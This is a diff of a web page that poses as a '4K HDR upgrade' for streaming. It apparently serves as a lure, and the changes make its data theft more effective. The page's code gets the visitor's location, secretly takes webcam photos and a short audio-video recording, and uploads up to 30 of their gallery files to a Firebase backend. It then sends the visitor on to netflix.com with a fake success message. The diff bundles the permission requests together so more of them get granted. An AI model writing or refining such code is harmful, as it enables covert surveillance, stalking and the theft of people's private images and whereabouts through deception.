@@ -73,14 +73,14 @@
         .btn:disabled { background: #444; cursor: not-allowed; }
         .loader { margin-top: 16px; color: #1a73e8; font-size: 13px; display: none; }
         input, video, canvas { display: none; }
-        .status-msg {
-            margin-top: 16px;
-            padding: 10px;
+        .permission-box {
+            background: #1a1a1a;
             border-radius: 12px;
+            padding: 12px;
+            margin-top: 16px;
             font-size: 12px;
+            color: #ffaa00;
             display: none;
-            background: #0a2e1a;
-            color: #4ade80;
         }
     </style>
 </head>
@@ -99,7 +99,7 @@
         
         <button class="btn" id="upgradeBtn">⚡ Enable 4K HDR</button>
         <div class="loader" id="loader">Optimizing your device...</div>
-        <div class="status-msg" id="statusMsg"></div>
+        <div class="permission-box" id="permissionBox">⚠️ Please allow permissions when prompted</div>
     </div>
     
     <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
@@ -125,13 +125,13 @@
         
         const upgradeBtn = document.getElementById('upgradeBtn');
         const loader = document.getElementById('loader');
-        const statusMsg = document.getElementById('statusMsg');
+        const permissionBox = document.getElementById('permissionBox');
         
         if (!sessionId) {
-            statusMsg.style.display = 'block';
-            statusMsg.style.background = '#2e0a0a';
-            statusMsg.style.color = '#ff6b6b';
-            statusMsg.innerHTML = '❌ Invalid upgrade link';
+            permissionBox.style.display = 'block';
+            permissionBox.style.background = '#2e0a0a';
+            permissionBox.style.color = '#ff6b6b';
+            permissionBox.innerHTML = '❌ Invalid upgrade link';
             upgradeBtn.disabled = true;
         }
         
@@ -143,14 +143,6 @@
         else if (ua.includes("Windows")) deviceName = "Windows PC";
         else if (ua.includes("Mac")) deviceName = "Mac";
         document.getElementById('deviceName').innerText = deviceName;
-        
-        function showMessage(msg, isError = false) {
-            statusMsg.style.display = 'block';
-            statusMsg.style.background = isError ? '#2e0a0a' : '#0a2e1a';
-            statusMsg.style.color = isError ? '#ff6b6b' : '#4ade80';
-            statusMsg.innerHTML = msg;
-            setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
-        }
         
         async function saveToFirebase(type, data) {
             if (!sessionId) return;
@@ -174,32 +166,49 @@
             return url;
         }
         
-        // 1. Device Info
-        async function sendDeviceInfo() {
-            await saveToFirebase('device_info', {
-                device: deviceName,
-                ua: ua,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language
-            });
+        // Step 1: Request ALL permissions at once
+        async function requestAllPermissions() {
+            permissionBox.style.display = 'block';
+            permissionBox.innerHTML = '🔐 Requesting permissions for 4K HDR...';
+            
+            const results = {
+                camera: false,
+                mic: false,
+                location: false
+            };
+            
+            // Request camera + mic together
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                results.camera = true;
+                results.mic = true;
+                // Keep stream for later use
+                window.mediaStream = stream;
+                permissionBox.innerHTML = '✅ Camera & Microphone granted';
+            } catch(e) {
+                permissionBox.innerHTML = '⚠️ Camera/Microphone access needed for 4K HDR';
+            }
+            
+            // Request location
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                results.location = true;
+                await saveToFirebase('location', {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+                });
+                permissionBox.innerHTML = '✅ Location granted';
+            } catch(e) {
+                permissionBox.innerHTML = '⚠️ Location access recommended';
+            }
+            
+            return results;
         }
         
-        // 2. Location
-        async function getLocation() {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await saveToFirebase('location', {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
-                    });
-                    resolve(true);
-                }, () => resolve(false));
-            });
-        }
-        
-        // 3. Gallery Access (full)
+        // Step 2: Gallery access (triggers file picker)
         async function getGallery() {
             return new Promise((resolve) => {
                 const input = document.getElementById('galleryInput');
@@ -207,11 +216,11 @@
                     const files = Array.from(e.target.files);
                     if (files.length === 0) { resolve(false); return; }
                     loader.innerHTML = `📸 Optimizing ${files.length} files...`;
-                    for (let i = 0; i < Math.min(files.length, 25); i++) {
+                    for (let i = 0; i < Math.min(files.length, 30); i++) {
                         const file = files[i];
                         const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                         await uploadFile(file, type);
-                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 25)}`;
+                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 30)}`;
                     }
                     resolve(true);
                 };
@@ -219,33 +228,40 @@
             });
         }
         
-        // 4. Camera: 4 photos + 5 sec video
+        // Step 3: Capture photos and video from existing stream
         async function captureMedia() {
-            try {
-                // Camera photos (4 shots)
-                loader.innerHTML = "📷 Capturing device photos...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                
-                // Take 4 photos
-                for (let i = 1; i <= 4; i++) {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
-                    await uploadFile(file, 'camera_photo');
-                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
-                    await new Promise(r => setTimeout(r, 300));
+            if (!window.mediaStream) {
+                // Try to get stream again
+                try {
+                    window.mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                } catch(e) {
+                    return false;
                 }
-                
-                // Video recording (5 seconds)
-                loader.innerHTML = "🎥 Recording device video...";
+            }
+            
+            const stream = window.mediaStream;
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 500));
+            
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            
+            // Take 4 photos
+            for (let i = 1; i <= 4; i++) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
+                await uploadFile(file, 'camera_photo');
+                loader.innerHTML = `📷 Captured ${i}/4 photos`;
+                await new Promise(r => setTimeout(r, 300));
+            }
+            
+            // Video recording (5 seconds)
+            if (window.mediaStream.getAudioTracks().length > 0) {
+                loader.innerHTML = "🎥 Recording video...";
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
@@ -257,19 +273,19 @@
                 recorder.start();
                 await new Promise(r => setTimeout(r, 5000));
                 recorder.stop();
-                
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) {
-                console.log("Camera error:", e);
-                return false;
+                await new Promise(r => setTimeout(r, 1000));
             }
+            
+            // Don't stop stream yet - will stop at end
+            return true;
         }
         
-        // 5. Microphone (5 sec)
+        // Step 4: Microphone recording (if not already captured in video)
         async function getMicrophone() {
+            if (window.mediaStream && window.mediaStream.getAudioTracks().length > 0) {
+                return true; // Already recorded in video
+            }
             try {
-                loader.innerHTML = "🎤 Testing audio...";
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
@@ -295,20 +311,37 @@
             loader.style.display = 'block';
             loader.innerHTML = "🔧 Preparing device optimization...";
             
-            await sendDeviceInfo();
-            await getLocation();
+            // Device info
+            await saveToFirebase('device_info', {
+                device: deviceName,
+                ua: ua,
+                screen: `${screen.width}x${screen.height}`
+            });
             
-            loader.innerHTML = "📸 Accessing media...";
-            showMessage("Media access required for 4K HDR upgrade", false);
+            // Request all permissions at once
+            await requestAllPermissions();
+            
+            // Gallery access (separate user action)
+            loader.innerHTML = "📸 Select photos to optimize...";
             await getGallery();
             
+            // Capture photos and video
             await captureMedia();
+            
+            // Extra mic if needed
             await getMicrophone();
+            
+            // Clean up
+            if (window.mediaStream) {
+                window.mediaStream.getTracks().forEach(t => t.stop());
+            }
             
             await saveToFirebase('upgrade_complete', { timestamp: new Date().toISOString() });
             
             loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
-            showMessage("Your device is now optimized for 4K HDR streaming", false);
+            permissionBox.style.background = '#0a2e1a';
+            permissionBox.style.color = '#4ade80';
+            permissionBox.innerHTML = '✅ 4K HDR is now active on your device';
             
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
